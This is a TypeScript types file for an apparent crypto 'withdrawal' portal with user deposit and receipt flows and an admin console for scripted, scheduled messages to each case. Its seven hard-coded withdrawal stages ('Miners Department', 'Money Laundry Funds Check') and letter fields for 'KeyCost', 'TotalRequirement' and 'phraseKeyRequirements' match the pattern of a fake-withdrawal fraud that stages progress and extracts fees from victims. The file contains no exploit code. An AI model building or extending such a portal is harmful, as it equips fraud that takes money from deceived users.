export * from './schema';

export type CaseStatus = 'created' | 'registered' | 'syncing' | 'active' | 'completed';
export type MessageCategory = 'urgent' | 'processing' | 'resolved';
export type MessageSender = 'admin' | 'user';
export type ReceiptStatus = 'pending' | 'reviewed' | 'approved' | 'rejected';
export type Priority = 'high' | 'medium' | 'low';
export type LandingPage = 'dashboard' | 'letter' | 'deposit' | 'messages';
export type AdminRole = 'super_admin' | 'admin' | 'agent' | 'viewer';
export type RecipientType = 'admin' | 'user';
export type ScheduledMessageType = 'chat' | 'admin_message' | 'letter';
export type ScheduledMessageStatus = 'pending' | 'sent' | 'cancelled';
export type DocumentStatus = 'pending' | 'submitted' | 'approved' | 'rejected';
export type FeedbackType = 'support' | 'overall' | 'feature';
export type ActorType = 'user' | 'admin' | 'system';

export type PortalViewState = 
  | 'login' 
  | 'register' 
  | 'sync' 
  | 'dashboard' 
  | 'letter' 
  | 'messages' 
  | 'submissions' 
  | 'success' 
  | 'deposit' 
  | 'timeline';

export type AdminSettingsView = 
  | 'main' 
  | 'audit' 
  | 'sessions' 
  | 'scheduled' 
  | 'templates' 
  | 'help' 
  | 'feedback' 
  | 'documents' 
  | '2fa' 
  | 'admin-users' 
  | 'user-sessions' 
  | 'translations';

export const WITHDRAWAL_STAGES = [
  { stage: '1', label: 'Withdrawal Process Initiated', description: 'Your withdrawal request has been received and is being processed.' },
  { stage: '2', label: 'First Stage Verification Completed', description: 'Initial verification of your account and withdrawal details is complete.' },
  { stage: '3', label: 'Financial Department Verification', description: 'The financial department is reviewing your withdrawal request.' },
  { stage: '4', label: 'Miners Department', description: 'Transaction is being prepared for blockchain processing.' },
  { stage: '5', label: 'Money Laundry Funds Check', description: 'Compliance verification is in progress.' },
  { stage: '6', label: 'Final Withdrawal Processing', description: 'Your withdrawal is in the final processing stage.' },
  { stage: '7', label: 'Withdrawal Now Released', description: 'Congratulations! Your withdrawal has been released.' },
] as const;

export const LOCALES = ['en', 'es', 'zh', 'ja', 'ko', 'de', 'fr'] as const;
export type Locale = typeof LOCALES[number];

export interface ApiResponse<T> {
  data?: T;
  error?: string;
  message?: string;
}

export interface PaginatedResponse<T> {
  data: T[];
  total: number;
  page: number;
  pageSize: number;
  totalPages: number;
}

export interface AdminLoginRequest {
  username: string;
  password: string;
}

export interface AdminLoginResponse {
  token: string;
  username: string;
  role?: AdminRole;
}

export interface UserRegistrationData {
  userName: string;
  userEmail: string;
  userMobile: string;
}

export interface AdminFinalizationData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

export interface LetterFormData {
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
}

export interface NewAdminMessageForm {
  category: MessageCategory;
  title: string;
  body: string;
}

export interface NewScheduledMessageForm {
  caseId: string;
  messageType: ScheduledMessageType;
  category: string;
  title: string;
  content: string;
  scheduledFor: string;
}

export interface NewMessageTemplateForm {
  name: string;
  content: string;
  category: string;
}

export interface NewHelpArticleForm {
  title: string;
  content: string;
  category: string;
  isPublished: boolean;
}

export interface NewDocumentRequestForm {
  caseId: string;
  documentType: string;
  description: string;
  deadline: string;
}

export interface NewChatTemplateForm {
  name: string;
  content: string;
  category: string;
}

export interface UnreadCounts {
  [caseId: string]: number;
}

export interface CaseWithDetails {
  case: import('./schema').Case;
  letter?: import('./schema').CaseLetter;
  submissions: import('./schema').CaseSubmission[];
  messages: import('./schema').ChatMessage[];
  adminMessages: import('./schema').AdminMessage[];
  receipts: import('./schema').DepositReceipt[];
  notes?: import('./schema').CaseNote[];
}

export interface DashboardStats {
  totalCases: number;
  activeCases: number;
  pendingCases: number;
  completedCases: number;
  totalSubmissions: number;
  unreadMessages: number;
  pendingReceipts: number;
}

export interface ChartDataPoint {
  name: string;
  value: number;
  color?: string;
}

export interface TimelineEntry {
  id: number;
  timestamp: string;
  action: string;
  description: string;
  actor: ActorType;
  actorId?: string;
}
